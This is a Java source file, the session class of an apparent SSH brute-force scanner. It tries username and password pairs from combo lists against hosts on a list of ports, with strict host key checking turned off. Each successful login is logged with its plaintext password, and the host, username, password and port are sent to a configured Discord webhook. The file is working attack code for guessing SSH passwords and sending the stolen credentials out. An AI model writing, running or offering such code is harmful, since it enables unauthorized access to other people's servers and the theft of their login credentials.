package com.thisisnzed.sshscanner.session;

import com.jcraft.jsch.JSch;
import com.thisisnzed.sshscanner.addons.impl.Combo;
import com.thisisnzed.sshscanner.addons.impl.PortList;
import com.thisisnzed.sshscanner.arguments.Configuration;
import com.thisisnzed.sshscanner.utils.DiscordWebhook;
import com.thisisnzed.sshscanner.utils.Logger;

import java.util.ArrayList;
import java.util.Properties;

public class Session {

    private final Configuration configuration;
    private final JSch jSch;
    private final Properties properties;
    private final String falsePositive;
    private final PortList portList;

    public Session(final Combo combo, final Configuration configuration, final JSch jSch, final Properties properties, final PortList portList) {
        final String[] splited = combo.getList().get(0).split(":");
        this.falsePositive = splited[0] + ":" + splited[1];
        this.configuration = configuration;
        this.jSch = jSch;
        this.properties = properties;
        this.properties.put("StrictHostKeyChecking", "no");
        this.portList = portList;
    }

    public boolean connect(final String host, final String username, final String password) {
        final ArrayList<String> ports = this.portList != null ? this.portList.getList() : new ArrayList<>();
        if (this.portList == null) ports.add(String.valueOf(this.configuration.get("port")));
        boolean success = true;
        for (final String p : ports) {
            if (success) {
                final int port = Integer.parseInt(p);
                try {
                    final com.jcraft.jsch.Session session = this.jSch.getSession(username, host, port);
                    session.setPassword(password);
                    session.setConfig(this.properties);
                    session.setTimeout(Integer.parseInt(String.valueOf(this.configuration.get("timeout"))));
                    session.connect();
                    if (!(username + ":" + password).equals(this.falsePositive)) {
                        Logger.log(String.format("[%d] %s@%s:%d (password: %s) | Connected", Thread.currentThread().getId(), username, host, port, password));
                        if (!this.configuration.get("webhook").equals(""))
                            new DiscordWebhook((String) this.configuration.get("webhook")).sendWebhook(host, username, password, port);
                    }
                    session.disconnect();
                    success = false;
                } catch (final Exception exception) {
                    if (Boolean.parseBoolean(String.valueOf(this.configuration.get("verbose"))))
                        Logger.log(String.format("[%d] %s@%s:%d (password: %s) | %s", Thread.currentThread().getId(), username, host, port, password, exception.getMessage()));
                    success = !exception.getMessage().toLowerCase().contains("auth fail");
                }
            }
        }
        return success;
    }
}
